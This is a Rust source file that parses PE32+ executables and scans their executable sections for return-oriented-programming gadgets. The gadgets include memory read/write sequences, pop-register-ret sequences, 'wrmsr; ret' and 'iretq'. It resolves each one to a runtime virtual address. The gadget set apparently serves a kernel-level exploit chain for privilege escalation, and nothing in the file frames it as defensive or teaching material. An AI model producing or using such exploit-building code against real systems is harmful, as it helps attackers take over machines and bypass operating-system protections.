use anyhow::{bail, Result};

#[derive(Debug, Copy, Clone, PartialEq)]
pub enum ReadReg {
    Rax, Rdx, R8, R9
}

#[derive(Debug, Default)]
pub struct Gadgets {
    pub write_mem: Option<u64>,
    pub read_mem: Option<(u64, ReadReg)>,
    pub pop_rcx: Option<u64>,
    pub pop_rax: Option<u64>,
    pub pop_rdx: Option<u64>,
    pub wrmsr_ret: Option<u64>,
    pub iretq: Option<u64>,
}

impl Gadgets {
    pub fn all_found(&self) -> bool {
        self.write_mem.is_some()
            && self.read_mem.is_some()
            && self.pop_rcx.is_some()
            && self.pop_rax.is_some()
            && self.pop_rdx.is_some()
            && self.wrmsr_ret.is_some()
            && self.iretq.is_some()
    }
}

struct GadgetPattern {
    bytes: &'static [u8],
    name: &'static str,
}

static PATTERNS: &[GadgetPattern] = &[
    GadgetPattern { bytes: &[0x48, 0x89, 0x02, 0xC3], name: "write_mem" },
    GadgetPattern { bytes: &[0x48, 0x8B, 0x00, 0xC3], name: "read_mem_rax" },
    GadgetPattern { bytes: &[0x48, 0x8B, 0x02, 0xC3], name: "read_mem_rdx" },
    GadgetPattern { bytes: &[0x49, 0x8B, 0x00, 0xC3], name: "read_mem_r8" },
    GadgetPattern { bytes: &[0x49, 0x8B, 0x01, 0xC3], name: "read_mem_r9" },
    GadgetPattern { bytes: &[0x59, 0xC3],              name: "pop_rcx; ret" },
    GadgetPattern { bytes: &[0x58, 0xC3],              name: "pop_rax; ret" },
    GadgetPattern { bytes: &[0x5A, 0xC3],              name: "pop_rdx; ret" },
    GadgetPattern { bytes: &[0x0F, 0x30, 0xC3],        name: "wrmsr; ret" },
    GadgetPattern { bytes: &[0x48, 0xCF],              name: "iretq" },
];

fn scan_section_for_pattern(data: &[u8], pat: &[u8]) -> Option<usize> {
    data.windows(pat.len()).position(|w| w == pat)
}

pub fn scan_gadgets_in_pe(pe_bytes: &[u8], runtime_base: u64) -> Result<Gadgets> {
    if pe_bytes.len() < 0x40 { bail!("PE too small for DOS header"); }
    if pe_bytes[0..2] != [0x4D, 0x5A] { bail!("not a valid PE (bad MZ)"); }
    let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into()?) as usize;
    if e_lfanew + 24 + 2 > pe_bytes.len() { bail!("e_lfanew out of bounds"); }

    if pe_bytes[e_lfanew..e_lfanew + 4] != [0x50, 0x45, 0x00, 0x00] { bail!("bad PE signature"); }

    let num_sections = u16::from_le_bytes(pe_bytes[e_lfanew + 6..e_lfanew + 8].try_into()?) as usize;
    let opt_hdr_size = u16::from_le_bytes(pe_bytes[e_lfanew + 20..e_lfanew + 22].try_into()?) as usize;

    let opt_off = e_lfanew + 24;
    if opt_off + 2 > pe_bytes.len() { bail!("optional header missing"); }
    let magic = u16::from_le_bytes(pe_bytes[opt_off..opt_off + 2].try_into()?);
    if magic != 0x020B { bail!("not PE32+ (magic=0x{:04X})", magic); }

    let preferred_base = u64::from_le_bytes(pe_bytes[opt_off + 24..opt_off + 32].try_into()?);
    let slide = runtime_base.wrapping_sub(preferred_base);

    let sec_table_off = opt_off + opt_hdr_size;
    const SEC_HDR: usize = 40;
    let mut gadgets = Gadgets::default();

    for i in 0..num_sections {
        let sh = sec_table_off + i * SEC_HDR;
        if sh + SEC_HDR > pe_bytes.len() { break; }

        let characteristics = u32::from_le_bytes(pe_bytes[sh + 36..sh + 40].try_into()?);
        if characteristics & 0x2000_0000 == 0 { continue; }

        let virtual_address = u32::from_le_bytes(pe_bytes[sh + 12..sh + 16].try_into()?) as usize;
        let size_of_raw_data = u32::from_le_bytes(pe_bytes[sh + 16..sh + 20].try_into()?) as usize;
        let ptr_to_raw_data = u32::from_le_bytes(pe_bytes[sh + 20..sh + 24].try_into()?) as usize;

        if ptr_to_raw_data + size_of_raw_data > pe_bytes.len() { continue; }
        let section = &pe_bytes[ptr_to_raw_data..ptr_to_raw_data + size_of_raw_data];

        for pat in PATTERNS {
            if let Some(off) = scan_section_for_pattern(section, pat.bytes) {
                let rva = virtual_address + off;
                let va = runtime_base.wrapping_add(rva as u64);
                let _ = slide;
                match pat.name {
                    "write_mem" => { gadgets.write_mem.get_or_insert(va); }
                    "read_mem_rax" if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::Rax)); }
                    "read_mem_rdx" if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::Rdx)); }
                    "read_mem_r8"  if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::R8));  }
                    "read_mem_r9"  if gadgets.read_mem.is_none() => { gadgets.read_mem = Some((va, ReadReg::R9));  }
                    n if n.starts_with("pop_rcx")   => { gadgets.pop_rcx.get_or_insert(va); }
                    n if n.starts_with("pop_rax")   => { gadgets.pop_rax.get_or_insert(va); }
                    n if n.starts_with("pop_rdx")   => { gadgets.pop_rdx.get_or_insert(va); }
                    n if n.starts_with("wrmsr")     => { gadgets.wrmsr_ret.get_or_insert(va); }
                    n if n.starts_with("iretq")     => { gadgets.iretq.get_or_insert(va); }
                    _ => {}
                }
            }
        }
    }

    Ok(gadgets)
}
